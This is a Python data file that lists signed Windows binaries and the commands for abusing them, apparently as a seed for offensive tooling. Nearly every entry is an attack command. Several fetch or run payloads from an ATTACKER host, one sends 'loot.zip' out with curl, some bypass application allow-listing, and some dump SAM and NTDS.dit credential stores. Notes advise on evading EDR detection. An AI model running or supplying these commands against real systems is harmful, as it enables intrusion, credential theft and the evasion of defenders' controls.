"""Curated LOLBAS seed — signed Windows binaries abusable off the land.

One entry per binary. `functions` keys follow LOLBAS categories:
  download   - fetch a remote file (staging)
  execute    - run code / a payload, often signed-binary proxy execution
  awl-bypass - AppLocker / WDAC bypass via a trusted binary
  upload     - exfil a local file

Commands use ATTACKER / URL / PATH placeholders. High-value subset only.
Full data: https://lolbas-project.github.io
"""

from __future__ import annotations

LOLBAS: dict[str, dict[str, list[str]]] = {
    "certutil.exe": {
        "download": [
            r"certutil -urlcache -split -f http://ATTACKER/payload.exe C:\Windows\Temp\p.exe",
            "certutil.exe -verifyctl -f -split http://ATTACKER/payload.exe out.exe",
        ],
        "decode": ["certutil -decode payload.b64 payload.exe", "certutil -encode input.exe out.b64"],
        "note": ["Heavily EDR-flagged; prefer curl.exe / bitsadmin / esentutl for quieter staging."],
    },
    "bitsadmin.exe": {
        "download": [r"bitsadmin /transfer j /download /priority normal http://ATTACKER/p.exe C:\Windows\Temp\p.exe"],
    },
    "mshta.exe": {
        "execute": ["mshta http://ATTACKER/evil.hta", "mshta vbscript:Execute(\"...\")(window.close)"],
        "awl-bypass": ["mshta http://ATTACKER/evil.hta"],
    },
    "regsvr32.exe": {
        "execute": ["regsvr32 /s /n /u /i:http://ATTACKER/file.sct scrobj.dll  # Squiblydoo"],
        "awl-bypass": ["regsvr32 /s /n /u /i:http://ATTACKER/file.sct scrobj.dll"],
    },
    "rundll32.exe": {
        "execute": [
            r"rundll32.exe shell32.dll,Control_RunDLL C:\path\evil.dll",
            r"rundll32.exe C:\path\evil.dll,EntryPoint",
            "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";eval(\"...\")",
        ],
        "awl-bypass": ["rundll32.exe javascript:...  # proxy exec via signed binary"],
    },
    "msbuild.exe": {
        "execute": ["msbuild.exe evil.csproj  # inline <Task>/<Code> C# runs at build time"],
        "awl-bypass": ["msbuild.exe payload.xml  # inline task, no compiler needed"],
    },
    "installutil.exe": {
        "execute": [r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U evil.exe"],
        "awl-bypass": ["InstallUtil.exe /U evil.exe  # runs Uninstall method, bypasses AWL"],
    },
    "wmic.exe": {
        "execute": [
            "wmic process call create \"cmd.exe /c payload\"",
            "wmic /node:TARGET process call create \"...\"  # lateral movement",
            "wmic os get /format:\"http://ATTACKER/evil.xsl\"  # XSL script exec",
        ],
    },
    "cscript.exe": {"execute": ["cscript.exe evil.vbs", "cscript //e:jscript evil.js"]},
    "wscript.exe": {"execute": ["wscript.exe evil.vbs"]},
    "cmstp.exe": {
        "execute": ["cmstp.exe /ni /s evil.inf  # runs command in INF, UAC bypass"],
        "awl-bypass": ["cmstp.exe /ni /s evil.inf"],
    },
    "msiexec.exe": {
        "execute": ["msiexec /q /i http://ATTACKER/evil.msi", "msiexec /y evil.dll"],
        "download": ["msiexec /q /i http://ATTACKER/evil.msi"],
    },
    "forfiles.exe": {"execute": [r"forfiles /p c:\windows\system32 /m notepad.exe /c payload.exe"]},
    "odbcconf.exe": {"execute": ["odbcconf /a {REGSVR evil.dll}"], "awl-bypass": ["odbcconf /a {REGSVR evil.dll}"]},
    "regasm.exe": {"execute": ["regasm.exe /U evil.dll"], "awl-bypass": ["regasm.exe evil.dll"]},
    "regsvcs.exe": {"execute": ["regsvcs.exe evil.dll"], "awl-bypass": ["regsvcs.exe evil.dll"]},
    "hh.exe": {"execute": ["hh.exe http://ATTACKER/evil.chm", "hh.exe evil.chm"]},
    "curl.exe": {
        "download": [r"curl.exe http://ATTACKER/p.exe -o C:\Windows\Temp\p.exe"],
        "upload": ["curl.exe -T C:\\loot.zip http://ATTACKER/"],
    },
    "esentutl.exe": {
        "download": [r"esentutl.exe /y \\ATTACKER\share\p.exe /d C:\Windows\Temp\p.exe /o"],
        "note": ["Copies over SMB/UNC; quieter than certutil for staging."],
    },
    "findstr.exe": {
        "download": [r"findstr /V /L W3AllLov3DonaldTrump \\ATTACKER\share\p.exe > C:\Temp\p.exe"],
        "upload": [r"findstr /S /I pass *.txt  # local secret hunt"],
    },
    "extrac32.exe": {"download": [r"extrac32 \\ATTACKER\share\file.cab C:\Temp\file.exe"]},
    "expand.exe": {"download": [r"expand \\ATTACKER\share\file.txt C:\Temp\file.txt"]},
    "print.exe": {"download": [r"print /D:C:\Temp\out.exe \\ATTACKER\share\p.exe"]},
    "replace.exe": {"download": [r"replace.exe \\ATTACKER\share\p.exe C:\Temp\ /A"]},
    "makecab.exe": {"execute": ["makecab payload.dll payload.cab  # stage/compress for transfer"]},
    "diskshadow.exe": {"execute": ["diskshadow /s evil.txt  # exec commands from script; VSS abuse for SAM/NTDS"]},
    "esentutl_ntds": {"dump": [r"esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\Temp\ntds.dit"]},
    "reg.exe": {
        "dump": ["reg save HKLM\\SAM sam.hive", "reg save HKLM\\SYSTEM system.hive", "reg save HKLM\\SECURITY sec.hive"],
        "note": ["Offline: secretsdump.py -sam sam.hive -system system.hive LOCAL"],
    },
    "vssadmin.exe": {"dump": ["vssadmin create shadow /for=C:  # then copy NTDS.dit / SAM from the shadow"]},
    "ntdsutil.exe": {"dump": ["ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Temp\" q q  # NTDS.dit + SYSTEM"]},
}
